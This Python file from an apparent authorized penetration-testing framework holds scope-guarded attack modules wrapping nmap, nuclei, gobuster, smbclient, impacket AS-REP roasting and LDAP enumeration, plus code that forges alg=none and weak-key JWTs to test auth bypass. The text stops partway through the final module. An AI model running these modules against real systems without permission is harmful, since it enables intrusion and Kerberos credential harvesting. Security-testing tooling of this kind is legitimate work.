"""P4 pack — real active-offense modules backed by Kali tooling.

Design rules (same as P1–P3)
----------------------------
* Every module is scope-guarded through ``require_in_scope`` before any
  packet leaves the box, and again for every redirect hop.
* Missing external tools are an honest, actionable error (with the apt
  fix) — never an empty "clean" result.
* All subprocess calls are bounded (timeouts + output caps) and argv-based
  (no shell interpolation of targets).
* Tier-1 = read-only observation, Tier-2 = active probing behind the
  APPROVE/CONFIRM gate, Tier-3 = state-changing (none here; runbooks).

Modules
-------
nuclei_scan             nuclei vulnerability templates (-jsonl, rate-limited)
nmap_service_scan       nmap -sV service/version detection
gobuster_content_enum   gobuster dir content discovery (seclists wordlist)
smb_share_enum          anonymous SMB share listing (smbclient)
kerberos_asrep_roast    AS-REP roasting via impacket GetNPUsers
ldap_ad_enum            anonymous LDAP rootDSE / base enumeration
jwt_active_check        alg=none / weak-HS256 acceptance test on one endpoint
git_exposure_check      .git directory exposure (HEAD/config/index)
endpoint_diff_fuzzer    parameter discovery via response diffing
vhost_bruteforce        virtual-host discovery via Host-header diffing
cert_transparency       crt.sh certificate-transparency subdomain recon
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import shutil
import socket
import subprocess
from pathlib import Path
from typing import Any, Dict, List, Optional
from urllib.parse import urljoin, urlparse

from modules.logger import ARDFLogger
from modules.session import Finding, SeverityLevel, Session

from .base import AttackModule, require_in_scope
from .p3_pack import _SEV, _base_url, _host_of, _http

_UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
       "(KHTML, like Gecko) Chrome/124.0 Safari/537.36 "
       "ARDF/3.1 authorized-assessment")

# seclists locations (Kali); first existing wins unless spec overrides
_SECLISTS_DIR = Path("/usr/share/seclists")
_WORDLIST_FALLBACKS = {
    "content": [_SECLISTS_DIR / "Discovery/Web-Content/common.txt",
                _SECLISTS_DIR / "Discovery/Web-Content/raft-small-words.txt",
                # dirb ships common.txt too (installed with apt dirb)
                Path("/usr/share/dirb/wordlists/common.txt"),
                Path("/usr/share/dirb/wordlists/big.txt")],
    "vhost": [_SECLISTS_DIR / "Discovery/DNS/subdomains-top1million-5000.txt",
              _SECLISTS_DIR / "Discovery/DNS/subdomains-top1million-20000.txt"],
}


def _finding(session: Session, title: str, severity: str, host: str = "",
             evidence: str = "", tags: Optional[List[str]] = None,
             description: str = "", remediation: str = "",
             raw: Optional[Dict[str, Any]] = None) -> Finding:
    f = Finding(source="attacks.p4", title=title[:180],
                description=description[:800],
                severity=_SEV.get(severity, SeverityLevel.INFO),
                host=host[:200], evidence=(evidence or "")[:3000],
                tags=["p4"] + list(tags or []), remediation=remediation[:800],
                raw=raw or {})
    session.add_finding(f)
    return f


def _plan(session: Session, spec: Dict[str, Any]) -> str:
    target = str(spec.get("target") or getattr(session.meta, "target", "")
                 or "").strip()
    require_in_scope(target)
    return target


def _need(*names: str, fix: str) -> str:
    """First available binary, or an honest actionable error."""
    for n in names:
        p = shutil.which(n)
        if p:
            return p
    raise RuntimeError(
        f"required tool '{names[0]}' not found on PATH; {fix}")


def _run(argv: List[str], timeout: int = 300) -> Dict[str, Any]:
    """Bounded, argv-based subprocess run (no shell)."""
    proc = subprocess.run(argv, capture_output=True, text=True,
                          timeout=timeout, errors="replace")
    return {"rc": proc.returncode,
            "stdout": (proc.stdout or "")[-20000:],
            "stderr": (proc.stderr or "")[-4000:]}


def _port_open(host: str, port: int, timeout: float = 3.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False


def _wordlist(session_spec_kind: str, spec: Dict[str, Any]) -> str:
    """Resolve a wordlist: spec['wordlist'] > seclists fallbacks."""
    custom = str(spec.get("wordlist") or "").strip()
    if custom:
        if not Path(custom).exists():
            raise RuntimeError(f"wordlist not found: {custom}")
        return custom
    for cand in _WORDLIST_FALLBACKS.get(session_spec_kind, []):
        if cand.exists():
            return str(cand)
    raise RuntimeError(
        "no wordlist found; pass spec['wordlist'] or install seclists "
        "(./setup.sh --with-wordlists)")


# ═══════════════════════════════════════════════════════════════
# binary-backed scanners
# ═══════════════════════════════════════════════════════════════

class NmapServiceScan(AttackModule):
    id = "nmap_service_scan"
    title = "nmap service/version detection"
    phase = "P4"
    tier = 2
    summary = ("Runs nmap -sV over the requested ports (default top-1000) "
               "and records open services with version hints.")

    def plan(self, session: Session, spec: Dict[str, Any],
             logger: ARDFLogger) -> Dict[str, Any]:
        host = _host_of(_plan(session, spec))
        return {"module": self.id, "mode": "plan", "host": host,
                "ports": str(spec.get("ports") or "top-1000"),
                "steps": ["resolve target", "nmap -sV -T3 --open",
                          "parse service/version table", "record findings"]}

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        host = _host_of(_plan(session, spec))
        ports = str(spec.get("ports") or "").strip() or None
        nmap = _need("nmap", fix="apt install nmap")
        argv = [nmap, "-sV", "-T3", "--open", "--host-timeout", "8m",
                "-Pn", host]
        if ports:
            argv[3:3] = ["-p", ports]
        try:
            proc = _run(argv, timeout=540)
        except subprocess.TimeoutExpired:
            return {"module": self.id, "mode": "exec", "host": host,
                    "status": "timeout", "tool": "nmap"}
        rows = []
        for line in proc["stdout"].splitlines():
            m = re.match(r"^(\d+)/(open|open\|filtered)\s+(\S+)\s*(.*)$", line.strip())
            if m:
                rows.append({"port": int(m.group(1)), "proto": "tcp",
                             "state": m.group(2), "service": m.group(3),
                             "version": (m.group(4) or "").strip()})
        if rows:
            evidence = "\n".join(
                f"{r['port']}/tcp {r['service']} {r['version']}".rstrip()
                for r in rows[:50])
            _finding(session, f"nmap services {host} ({len(rows)} open)",
                     "medium" if any(r["version"] for r in rows) else "info",
                     host=host, evidence=evidence, tags=["nmap", "services"],
                     description="Service/version detection results.",
                     remediation="Keep service banners minimal and patched.",
                     raw={"host": host, "ports": rows[:100],
                          "rc": proc["rc"]})
        logger.info(f"nmap {host}: {len(rows)} open service(s)")
        return {"module": self.id, "mode": "exec", "host": host,
                "open_services": rows[:100], "rc": proc["rc"],
                "stderr": proc["stderr"][-400:]}


class NucleiScan(AttackModule):
    id = "nuclei_scan"
    title = "nuclei template scan"
    phase = "P4"
    tier = 2
    summary = ("Runs projectdiscovery nuclei templates against the target "
               "URL, rate-limited, JSONL results folded into findings.")

    def plan(self, session: Session, spec: Dict[str, Any],
             logger: ARDFLogger) -> Dict[str, Any]:
        url = _base_url(session, spec)
        return {"module": self.id, "mode": "plan", "target": url,
                "severity": str(spec.get("severity") or
                                "low,medium,high,critical"),
                "steps": ["verify scope", "nuclei -jsonl -rl <rate>",
                          "fold matched templates into findings"]}

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        url = _base_url(session, spec)
        require_in_scope(_host_of(url))
        nuclei = _need("nuclei", fix="apt install nuclei")
        sev = str(spec.get("severity") or "low,medium,high,critical")
        rate = max(1, min(int(spec.get("rate_limit") or 5), 50))
        argv = [nuclei, "-u", url, "-jsonl", "-severity", sev,
                "-rate-limit", str(rate), "-timeout", "10",
                "-retries", "1", "-silent", "-no-stderr"]
        try:
            proc = _run(argv, timeout=int(spec.get("timeout") or 900))
        except subprocess.TimeoutExpired:
            return {"module": self.id, "mode": "exec", "target": url,
                    "status": "timeout", "tool": "nuclei"}
        matches: List[Dict[str, Any]] = []
        for line in proc["stdout"].splitlines():
            line = line.strip()
            if not line.startswith("{"):
                continue
            try:
                hit = json.loads(line)
            except json.JSONDecodeError:
                continue
            info = hit.get("info") or {}
            matches.append({
                "template": hit.get("template-id") or hit.get("template"),
                "name": hit.get("name") or info.get("name"),
                "severity": str(info.get("severity") or "info").lower(),
                "matched_at": hit.get("matched-at") or hit.get("matched"),
                "type": hit.get("type"),
            })
        for m in matches[:50]:
            _finding(session, f"nuclei: {m['name'] or m['template']}",
                     m["severity"], host=_host_of(url),
                     evidence=f"template={m['template']} matched={m['matched_at']}",
                     tags=["nuclei", "vuln"],
                     description="Matched a public nuclei template.",
                     remediation="Patch or mitigate the matched weakness.",
                     raw=m)
        logger.info(f"nuclei {url}: {len(matches)} match(es)")
        return {"module": self.id, "mode": "exec", "target": url,
                "matches": matches[:100], "match_count": len(matches),
                "rc": proc["rc"]}


class GobusterContentEnum(AttackModule):
    id = "gobuster_content_enum"
    title = "gobuster content discovery"
    phase = "P4"
    tier = 2
    summary = ("Directory/content brute-force with gobuster using a "
               "seclists wordlist (or spec['wordlist']).")

    def plan(self, session: Session, spec: Dict[str, Any],
             logger: ARDFLogger) -> Dict[str, Any]:
        url = _base_url(session, spec)
        return {"module": self.id, "mode": "plan", "target": url,
                "steps": ["resolve wordlist", "gobuster dir -q -t 10",
                          "record status/size for interesting paths"]}

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        url = _base_url(session, spec)
        require_in_scope(_host_of(url))
        gob = _need("gobuster", fix="apt install gobuster")
        wl = _wordlist("content", spec)
        statuses = str(spec.get("statuses") or "200,204,301,302,307,401,403")
        threads = max(1, min(int(spec.get("threads") or 10), 30))
        argv = [gob, "dir", "-u", url, "-w", wl, "-q", "-t", str(threads),
                "--timeout", "10s", "-s", statuses, "--no-error",
                "-k", "--no-progress"]
        if spec.get("extensions"):
            argv += ["-x", str(spec["extensions"]).lstrip(".")]
        try:
            proc = _run(argv, timeout=int(spec.get("timeout") or 1200))
        except subprocess.TimeoutExpired:
            return {"module": self.id, "mode": "exec", "target": url,
                    "status": "timeout", "tool": "gobuster"}
        found: List[Dict[str, Any]] = []
        for line in proc["stdout"].splitlines():
            m = re.search(r"(/\S*?)\s+\(Status:\s*(\d+)\)", line)
            if m:
                found.append({"path": m.group(1), "status": int(m.group(2))})
        for hit in found[:40]:
            sev = "medium" if hit["status"] in (200, 401, 403) else "info"
            _finding(session, f"content discovered {hit['path']} "
                              f"({hit['status']})", sev,
                     host=_host_of(url),
                     evidence=f"{hit['status']} {urljoin(url, hit['path'])}",
                     tags=["gobuster", "content"],
                     description="Path surfaced by content discovery.",
                     remediation="Review exposure; gate admin/debug paths.",
                     raw=hit)
        logger.info(f"gobuster {url}: {len(found)} path(s)")
        return {"module": self.id, "mode": "exec", "target": url,
                "wordlist": wl, "found": found[:200],
                "found_count": len(found), "rc": proc["rc"]}


class SmbShareEnum(AttackModule):
    id = "smb_share_enum"
    title = "anonymous SMB share listing"
    phase = "P4"
    tier = 2
    summary = ("Lists SMB shares on tcp/445 with smbclient (-N). Flags "
               "anonymous access; no file writes.")

    def plan(self, session: Session, spec: Dict[str, Any],
             logger: ARDFLogger) -> Dict[str, Any]:
        host = _host_of(_plan(session, spec))
        return {"module": self.id, "mode": "plan", "host": host, "port": 445,
                "steps": ["check tcp/445", "smbclient -L //host -N",
                          "record share names/types"]}

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        host = _host_of(_plan(session, spec))
        require_in_scope(host)
        if not _port_open(host, 445):
            return {"module": self.id, "mode": "exec", "host": host,
                    "port": 445, "open": False}
        smb = _need("smbclient", fix="apt install smbclient")
        try:
            proc = _run([smb, "-L", f"//{host}", "-N", "-g", "--timeout", "20"],
                        timeout=60)
        except subprocess.TimeoutExpired:
            return {"module": self.id, "mode": "exec", "host": host,
                    "open": True, "status": "timeout", "tool": "smbclient"}
        shares: List[Dict[str, str]] = []
        for line in proc["stdout"].splitlines():
            parts = [p.strip() for p in line.split("|")]
            if len(parts) >= 2 and parts[0] in ("Disk", "IPC", "Printer",
                                                "Device"):
                shares.append({"name": parts[1], "type": parts[0],
                               "comment": parts[2] if len(parts) > 2 else ""})
        denied = proc["rc"] != 0 and not shares
        if shares:
            _finding(session, f"anonymous SMB shares on {host}",
                     "high", host=host,
                     evidence="\n".join(f"{s['type']}: {s['name']} "
                                        f"{s['comment']}".rstrip()
                                        for s in shares),
                     tags=["smb", "shares"],
                     description="SMB shares are listable without "
                                 "authentication.",
                     remediation="Require authentication for share listing; "
                                 "review share ACLs.",
                     raw={"host": host, "shares": shares})
        logger.info(f"smb {host}: {len(shares)} share(s) anonymous-listable")
        return {"module": self.id, "mode": "exec", "host": host, "port": 445,
                "open": True, "shares": shares,
                "anonymous": bool(shares),
                "denied": denied, "rc": proc["rc"],
                "stderr": proc["stderr"][-300:]}


class KerberosAsrepRoast(AttackModule):
    id = "kerberos_asrep_roast"
    title = "AS-REP roasting (GetNPUsers)"
    phase = "P4"
    tier = 2
    summary = ("Requests AS-REP blobs for users without pre-auth via "
               "impacket GetNPUsers against the in-scope DC.")

    def plan(self, session: Session, spec: Dict[str, Any],
             logger: ARDFLogger) -> Dict[str, Any]:
        host = _host_of(_plan(session, spec))
        return {"module": self.id, "mode": "plan", "dc": host,
                "users": len(str(spec.get("users") or "").split(",")),
                "steps": ["verify DC reachable (88/tcp)",
                          "GetNPUsers.py domain/-usersfile -no-pass",
                          "collect AS-REP hashes for offline cracking"]}

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        dc = _host_of(_plan(session, spec))
        require_in_scope(dc)
        domain = str(spec.get("domain") or "").strip()
        users_raw = str(spec.get("users") or "").strip()
        if not domain or not users_raw:
            return {"module": self.id, "mode": "exec", "status": "error",
                    "error": "spec['domain'] and spec['users'] "
                             "(comma-separated) are required"}
        gnp = _need("GetNPUsers.py", "impacket-GetNPUsers",
                    fix="apt install python3-impacket impacket-scripts")
        if not _port_open(dc, 88):
            return {"module": self.id, "mode": "exec", "dc": dc,
                    "port": 88, "open": False}
        users = [u.strip() for u in users_raw.split(",") if u.strip()][:50]
        import tempfile
        with tempfile.NamedTemporaryFile("w", suffix=".txt",
                                         delete=False) as tf:
            tf.write("\n".join(users) + "\n")
            ufile = tf.name
        try:
            proc = _run([gnp, f"{domain}/", "-usersfile", ufile,
                         "-no-pass", "-format", "hashcat", "-dc-ip", dc],
                        timeout=180)
        except subprocess.TimeoutExpired:
            return {"module": self.id, "mode": "exec", "dc": dc,
                    "status": "timeout", "tool": "GetNPUsers"}
        finally:
            try:
                Path(ufile).unlink()
            except OSError:
                pass
        hashes = re.findall(r"^\$krb5asrep\$[^\s]+", proc["stdout"],
                            re.MULTILINE)
        if hashes:
            _finding(session, f"AS-REP roasting: {len(hashes)} roastable "
                              f"account(s) on {domain}", "high", host=dc,
                     evidence="\n".join(h[:80] + "…" for h in hashes),
                     tags=["kerberos", "asrep", "credentials"],
                     description="Accounts allow Kerberos pre-authentication "
                                 "to be bypassed; hashes are crackable "
                                 "offline.",
                     remediation="Enable pre-authentication on these "
                                 "accounts and rotate their passwords.",
                     raw={"dc": dc, "domain": domain,
                          "hash_count": len(hashes), "hashes": hashes})
        logger.info(f"asrep {domain}@{dc}: {len(hashes)} roastable")
        return {"module": self.id, "mode": "exec", "dc": dc, "domain": domain,
                "hash_count": len(hashes), "hashes": hashes,
                "rc": proc["rc"], "stderr": proc["stderr"][-300:]}


class LdapAdEnum(AttackModule):
    id = "ldap_ad_enum"
    title = "anonymous LDAP rootDSE / base enum"
    phase = "P4"
    tier = 2
    summary = ("Queries ldap://<host> rootDSE and the naming context with "
               "ldapsearch; records directory posture and object counts.")

    def plan(self, session: Session, spec: Dict[str, Any],
             logger: ARDFLogger) -> Dict[str, Any]:
        host = _host_of(_plan(session, spec))
        return {"module": self.id, "mode": "plan", "host": host, "port": 389,
                "steps": ["check tcp/389",
                          "ldapsearch -x -s base -b '' rootDSE",
                          "ldapsearch naming context (-z capped)"]}

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        host = _host_of(_plan(session, spec))
        require_in_scope(host)
        port = int(spec.get("port") or 389)
        if not _port_open(host, port):
            return {"module": self.id, "mode": "exec", "host": host,
                    "port": port, "open": False}
        ldap = _need("ldapsearch", fix="apt install ldap-utils")
        uri = f"ldap://{host}:{port}"
        root = _run([ldap, "-x", "-H", uri, "-s", "base", "-b", "",
                     "(objectclass=*)", "-o", "ldif-wrap=no"], timeout=45)
        attrs: Dict[str, List[str]] = {}
        for line in root["stdout"].splitlines():
            m = re.match(r"^([a-zA-Z][\w-]*):\s?(.*)$", line)
            if m and not line.startswith(" "):
                attrs.setdefault(m.group(1).lower(), []).append(m.group(2))
        naming = (attrs.get("defaultnamingcontext") or
                  attrs.get("namingcontexts") or [""])[0]
        base_out = ""
        if naming:
            b = _run([ldap, "-x", "-H", uri, "-b", naming,
                      "(objectclass=*)", "-z", "50", "-o", "ldif-wrap=no"],
                     timeout=60)
            base_out = b["stdout"]
        entries = len(re.findall(r"^dn:", base_out, re.MULTILINE))
        anon = bool(attrs) and root["rc"] == 0
        if anon:
            _finding(session, f"anonymous LDAP access on {host}:{port}",
                     "medium", host=host,
                     evidence=("rootDSE attributes: " +
                               ", ".join(sorted(attrs)[:20]) +
                               (f"\nnamingContext: {naming}" if naming else "")),
                     tags=["ldap", "ad", "enum"],
                     description="Directory rootDSE is readable without "
                                 "credentials; leaks domain topology.",
                     remediation="Restrict anonymous/rootDSE reads.",
                     raw={"host": host, "port": port, "attrs": attrs,
                          "naming_context": naming, "base_entries": entries})
        logger.info(f"ldap {host}: anon={anon} naming={naming!r} "
                    f"base_entries={entries}")
        return {"module": self.id, "mode": "exec", "host": host, "port": port,
                "open": True, "anonymous_rootdse": anon,
                "naming_context": naming, "rootdse_attrs": attrs,
                "base_entries": entries, "rc": root["rc"]}


# ═══════════════════════════════════════════════════════════════
# protocol-level active checks (stdlib only)
# ═══════════════════════════════════════════════════════════════

def _jwt_parts(token: str) -> Optional[Dict[str, Any]]:
    try:
        h, p, s = token.strip().split(".")
        pad = lambda x: x + "=" * (-len(x) % 4)
        head = json.loads(base64.urlsafe_b64decode(pad(h)))
        payload = json.loads(base64.urlsafe_b64decode(pad(p)))
        return {"header": head, "payload": payload, "signing_input": f"{h}.{p}",
                "signature": s}
    except Exception:
        return None


def _jwt_resign(signing_input: str, alg: str, key: bytes) -> str:
    """Build an HS256 token over the ORIGINAL signing input with a weak key.

    (The signature is computed over the original ``header.payload`` bytes —
    exactly what a mis-implemented server that re-verifies with a guessed
    shared secret would accept.)
    """
    payload = signing_input.split(".", 1)[1]
    head = base64.urlsafe_b64encode(
        json.dumps({"alg": alg, "typ": "JWT"},
                   separators=(",", ":")).encode()).rstrip(b"=").decode()
    sig = hmac.new(key, signing_input.encode(), hashlib.sha256).digest()
    return (f"{head}.{payload}." +
            base64.urlsafe_b64encode(sig).rstrip(b"=").decode())


class JwtActiveCheck(AttackModule):
    id = "jwt_active_check"
    title = "JWT acceptance test (alg=none / weak HS256)"
    phase = "P4"
    tier = 2
    summary = ("Replays a provided JWT against its endpoint with an "
               "alg=none variant and weak HS256 keys; flags acceptance "
               "as auth bypass. Needs spec['jwt'] + spec['url'].")

    def plan(self, session: Session, spec: Dict[str, Any],
             logger: ARDFLogger) -> Dict[str, Any]:
        url = str(spec.get("target") or spec.get("url") or "")
        require_in_scope(_host_of(url) if url else
                         getattr(session.meta, "target", ""))
        return {"module": self.id, "mode": "plan", "target": url,
                "steps": ["baseline replay (expect 401/403)",
                          "alg=none variant",
                          "HS256 with weak keys (secret/password/admin)",
                          "any 2xx acceptance => critical finding"]}

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        url = str(spec.get("url") or spec.get("target") or "").strip()
        token = str(spec.get("jwt") or "").strip()
        if not url or not token:
            return {"module": self.id, "mode": "exec", "status": "error",
                    "error": "spec['url'] and spec['jwt'] are required"}
        require_in_scope(_host_of(url))
        parts = _jwt_parts(token)
        if not parts:
            return {"module": self.id, "mode": "exec", "status": "error",
                    "error": "token does not parse as a JWT"}
        hdr_name = str(spec.get("header") or "Authorization")
        prefix = str(spec.get("prefix") or "Bearer ")

        def send(jwt: str) -> Dict[str, Any]:
            return _http(url, "GET", headers={hdr_name: prefix + jwt},
                         timeout=10, allow_redirects=False)

        base = send(token)
        if not base.get("ok"):
            return {"module": self.id, "mode": "exec", "status": "error",
                    "error": f"baseline request failed: {base.get('error')}"}
        baseline = base["status"]
        variants: List[Dict[str, Any]] = []
        # alg=none (unsigned)
        none_head = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).rstrip(b"=").decode()
        unsigned = f"{none_head}.{parts['signing_input'].split('.', 1)[1]}."
        variants.append({"kind": "alg=none", "jwt": unsigned})
        # weak HS256 keys (only meaningful when original was HMAC family)
        if str(parts["header"].get("alg", "")).upper().startswith("HS"):
            for key in (b"secret", b"password", b"admin", b"changeme"):
                variants.append({
                    "kind": f"HS256 weak key {key.decode()!r}",
                    "jwt": _jwt_resign(parts["signing_input"], "HS256", key)})
        accepted: List[Dict[str, Any]] = []
        for v in variants:
            r = send(v["jwt"])
            status = r.get("status")
            if r.get("ok") and status is not None and 200 <= status < 300 \
                    and status != baseline:
                accepted.append({"kind": v["kind"], "status": status})
            elif r.get("ok") and status == baseline and baseline < 400:
                # same 2xx as a valid token — the tampered token was honoured
                accepted.append({"kind": v["kind"], "status": status,
                                 "note": "same 2xx as baseline"})
        if accepted:
            _finding(session, f"JWT auth bypass on {urlparse(url).path or '/'}",
                     "critical", host=_host_of(url),
                     evidence="\n".join(f"{a['kind']} -> HTTP {a['status']}"
                                        for a in accepted),
                     tags=["jwt", "auth-bypass"],
                     description="Endpoint accepted a tampered JWT.",
                     remediation="Enforce algorithm whitelisting and "
                                 "constant-time signature checks.",
                     raw={"url": url, "accepted": accepted,
                          "baseline_status": baseline})
        logger.info(f"jwt {url}: baseline={baseline} "
                    f"accepted_tampered={len(accepted)}")
        return {"module": self.id, "mode": "exec", "target": url,
                "baseline_status": baseline, "variants_tested": len(variants),
                "accepted": accepted, "bypass": bool(accepted)}


class GitExposureCheck(AttackModule):
    id = "git_exposure_check"
    title = "exposed .git directory"
    phase = "P4"
    tier = 2
    summary = ("Checks <base>/.git/HEAD, config and index exposure "
               "(read-only GETs).")

    def plan(self, session: Session, spec: Dict[str, Any],
             logger: ARDFLogger) -> Dict[str, Any]:
        url = _base_url(session, spec)
        return {"module": self.id, "mode": "plan", "target": url,
                "steps": ["GET /.git/HEAD", "GET /.git/config",
                          "HEAD-like content => high finding"]}

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        url = _base_url(session, spec)
        require_in_scope(_host_of(url))
        head = _http(urljoin(url.rstrip("/") + "/", ".git/HEAD"),
                     timeout=8, max_bytes=2048, allow_redirects=False)
        exposed = bool(head.get("ok") and head.get("status") == 200 and
                       re.match(r"^\s*ref:\s*refs/heads/", head.get("body", "")))
        detail: Dict[str, Any] = {"head": head.get("body", "")[:120]}
        if exposed:
            cfg = _http(urljoin(url.rstrip("/") + "/", ".git/config"),
                        timeout=8, max_bytes=4096, allow_redirects=False)
            if cfg.get("ok") and cfg.get("status") == 200:
                detail["config"] = cfg["body"][:600]
            _finding(session, f"exposed .git directory at {url}",
                     "high", host=_host_of(url),
                     evidence=f"HEAD: {detail['head']}\n"
                              f"config readable: {'config' in detail}",
                     tags=["git", "exposure", "source-leak"],
                     description="Repository metadata is publicly readable; "
                                 "full source and history can be recovered.",
                     remediation="Block /.git/ at the web server or WAF.",
                     raw={"url": url, **detail})
        logger.info(f"git exposure {url}: {exposed}")
        return {"module": self.id, "mode": "exec", "target": url,
                "exposed": exposed, **detail}


class EndpointDiffFuzzer(AttackModule):
    id = "endpoint_diff_fuzzer"
    title = "parameter discovery via response diffing"
    phase = "P4"
    tier = 2
    summary = ("Appends candidate parameters (spec['params'] or defaults) "
               "and flags responses that differ materially from the "
               "baseline. Bounded request budget.")

    def plan(self, session: Session, spec: Dict[str, Any],
             logger: ARDFLogger) -> Dict[str, Any]:
        url = _base_url(session, spec)
        return {"module": self.id, "mode": "plan", "target": url,
                "params": len(self._params(spec)),
                "steps": ["baseline GET", "per-param GET with canary value",
                          "diff status/length/body-hash"]}

    @staticmethod
    def _params(spec: Dict[str, Any]) -> List[str]:
        raw = spec.get("params")
        if isinstance(raw, (list, tuple)):
            return [str(p) for p in raw][:20]
        return ["id", "debug", "test", "admin", "source", "redirect"][:20]

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        url = _base_url(session, spec)
        require_in_scope(_host_of(url))
        sep = "&" if urlparse(url).query else "?"
        base = _http(url, timeout=8, max_bytes=200_000)
        if not base.get("ok"):
            return {"module": self.id, "mode": "exec", "status": "error",
                    "error": f"baseline failed: {base.get('error')}"}
        base_hash = hashlib.sha256(
            base["body"].encode()).hexdigest()[:16]
        diffs: List[Dict[str, Any]] = []
        for param in self._params(spec):
            probe = _http(f"{url}{sep}{param}=ardiffuzz1", timeout=8,
                          max_bytes=200_000, allow_redirects=False)
            if not probe.get("ok"):
                continue
            ph = hashlib.sha256(probe["body"].encode()).hexdigest()[:16]
            delta = abs(probe["bytes"] - base["bytes"])
            interesting = (probe["status"] != base["status"] or
                           (ph != base_hash and delta > 64))
            if interesting:
                diffs.append({"param": param, "status": probe["status"],
                              "bytes": probe["bytes"], "delta": delta,
                              "body_hash": ph})
        for d in diffs[:15]:
            _finding(session, f"parameter reacts: {d['param']} "
                              f"(HTTP {d['status']}, Δ{d['delta']}B)",
                     "medium", host=_host_of(url),
                     evidence=json.dumps(d),
                     tags=["fuzz", "params"],
                     description="Response changed when this parameter was "
                                 "supplied — worth manual review.",
                     remediation="Validate/allow-list request parameters.",
                     raw=d)
        logger.info(f"diff-fuzz {url}: {len(diffs)} reacting param(s)")
        return {"module": self.id, "mode": "exec", "target": url,
                "baseline": {"status": base["status"], "bytes": base["bytes"],
                             "hash": base_hash},
                "diffs": diffs, "tested": len(self._params(spec))}


class VhostBruteforce(AttackModule):
    id = "vhost_bruteforce"
    title = "virtual-host discovery (Host header diffing)"
    phase = "P4"
    tier = 2
    summary = ("Sends Host: <word>.<domain> headers against the target and "
               "flags responses that differ from an invalid-vhost "
               "baseline. Wordlist from seclists or spec['wordlist'].")

    def plan(self, session: Session, spec: Dict[str, Any],
             logger: ARDFLogger) -> Dict[str, Any]:
        url = _base_url(session, spec)
        return {"module": self.id, "mode": "plan", "target": url,
                "steps": ["baseline Host: ardf-invalid.invalid",
                          "sweep wordlist as Host headers",
                          "diff status/size vs baseline"]}

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        url = _base_url(session, spec)
        domain = _host_of(url)
        require_in_scope(domain)
        try:
            wl = _wordlist("vhost", spec)
        except RuntimeError:
            # offline fallback: small built-in list keeps the module usable
            wl = ""
            words = ["admin", "api", "dev", "staging", "test", "portal",
                     "internal", "intranet", "beta", "vpn", "mail", "git",
                     "ci", "grafana", "jenkins", "status"]
        else:
            words = []
            with open(wl, encoding="utf-8", errors="ignore") as fh:
                for i, line in enumerate(fh):
                    if i >= 200:
                        break
                    w = line.strip()
                    if w and not w.startswith("#") and "." not in w:
                        words.append(w)
        base = _http(url, timeout=6, max_bytes=100_000,
                     headers={"Host": "ardf-invalid.invalid"},
                     allow_redirects=False)
        if not base.get("ok"):
            return {"module": self.id, "mode": "exec", "status": "error",
                    "error": f"baseline failed: {base.get('error')}"}
        base_hash = hashlib.sha256(base["body"].encode()).hexdigest()[:16]
        hits: List[Dict[str, Any]] = []
        for w in words[:200]:
            vhost = f"{w}.{domain}"
            r = _http(url, timeout=6, max_bytes=100_000,
                      headers={"Host": vhost}, allow_redirects=False)
            if not r.get("ok"):
                continue
            rh = hashlib.sha256(r["body"].encode()).hexdigest()[:16]
            if r["status"] != base["status"] or (
                    rh != base_hash and
                    abs(r["bytes"] - base["bytes"]) > 64):
                hits.append({"vhost": vhost, "status": r["status"],
                             "bytes": r["bytes"]})
        for h in hits[:20]:
            _finding(session, f"vhost responds differently: {h['vhost']}",
                     "medium", host=domain,
                     evidence=json.dumps(h),
                     tags=["vhost", "enum"],
                     description="Virtual host answered differently from the "
                                 "invalid-host baseline.",
                     remediation="Ensure vhosts are intentional and secured.",
                     raw=h)
        logger.info(f"vhost {domain}: {len(hits)} differing vhost(s) "
                    f"of {min(len(words), 200)} tested")
        return {"module": self.id, "mode": "exec", "target": url,
                "wordlist": wl or "<builtin>", "tested": min(len(words), 200),
                "hits": hits, "baseline": {"status": base["status"],
                                           "bytes": base["bytes"]}}


class CertTransparency(AttackModule):
    id = "cert_transparency"
    title = "certificate-transparency recon (crt.sh)"
    phase = "P4"
    tier = 1
    summary = ("Passive subdomain discovery via crt.sh CT logs "
               "(third-party data; no direct target contact).")

    def plan(self, session: Session, spec: Dict[str, Any],
             logger: ARDFLogger) -> Dict[str, Any]:
        domain = _host_of(_plan(session, spec))
        return {"module": self.id, "mode": "plan", "domain": domain,
                "steps": ["query crt.sh ?q=%.domain&output=json",
                          "dedupe name_value entries",
                          "record discovered hostnames"]}

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        domain = _host_of(_plan(session, spec))
        if domain.startswith("www."):
            domain = domain[4:]
        r = _http(f"https://crt.sh/?q=%25.{domain}&output=json",
                  timeout=25, max_bytes=4_000_000)
        if not r.get("ok"):
            return {"module": self.id, "mode": "exec", "status": "error",
                    "error": f"crt.sh query failed: {r.get('error')}"}
        names: set = set()
        try:
            for row in json.loads(r["body"]):
                for nv in str(row.get("name_value") or "").splitlines():
                    nv = nv.strip().lower().lstrip("*.")
                    if nv.endswith(domain) and " " not in nv:
                        names.add(nv)
        except json.JSONDecodeError:
            return {"module": self.id, "mode": "exec", "status": "error",
                    "error": "crt.sh returned non-JSON (rate limit?)"}
        found = sorted(names)[:500]
        if found:
            _finding(session, f"CT logs list {len(found)} hostname(s) "
                              f"for {domain}", "info", host=domain,
